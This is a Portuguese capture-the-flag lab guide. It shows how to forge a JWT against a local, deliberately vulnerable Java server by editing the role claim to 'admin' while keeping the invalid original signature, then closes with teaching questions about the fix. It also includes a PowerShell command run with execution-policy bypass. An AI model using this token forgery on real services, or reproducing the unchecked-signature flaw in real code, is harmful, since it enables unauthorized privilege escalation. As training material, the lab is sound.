# CTF:  Explorando Falha de Validação de JWT

## OBJETIVO:
Acesse `/admin/flag` e roube a flag, mesmo sendo um usuário comum.

## PASSO A PASSO:

1. Compile e execute o servidor:
   > javac -cp lib/java-jwt-4.4.0.jar CTFServer.java
   > java -cp "lib/java-jwt-4.4.0.jar;lib/jackson-core-2.15.2.jar;lib/jackson-databind-2.15.2.jar;lib/jackson-annotations-2.15.2.jar;." CTFServer

   (No Linux/Mac, use ":" em vez de ";")

2. Faça login para obter seu JWT:
   > curl -X POST http://localhost:8080/auth/login -d '{"username":"alice","password":"senha123"}'
   ou no PowerShell
   > curl.exe -X POST http://localhost:8080/auth/login -H "Content-Type: application/json" -d '{\"username\":\"alice\",\"password\":\"senha123\"}'

> Caso não tenha instale: winget install curl

3. Copie o token retornado.

4. Tente acessar o endpoint `/admin/flag` com esse token
    > curl.exe -H "Authorization: Bearer {substitua pelo token recebido do passo anterior}}" http://localhost:8080/admin/flag
    > Deve obter a resposta:
    >> Você não é admin.

5. Acesse https://jwt.io — cole o token.

6. Copie o payload, e acesse https://www.base64encode.org/, cole e mude:
      "role": "user"
   para:
      "role": "admin"

7. Agora, na mão, monte o token adulterado:
- O token JWT tem 3 partes: HEADER.PAYLOAD.ASSINATURA
- Você vai manter o HEADER e a ASSINATURA do token original
- Só vai trocar o PAYLOAD pelo que você editou

8. Copie o token MODIFICADO (mesmo com assinatura INVÁLIDA).

9. Acesse a flag:
   > curl -H "Authorization: Bearer SEU_TOKEN_AQUI" http://localhost:8080/admin/flag

10. FLAG OBTIDA!

DISCUSSÃO:
- Por que isso funcionou?
- Como corrigir?
- O que aconteceria em um sistema real com essa falha?

powershell -ExecutionPolicy Bypass .\CTFServer.ps1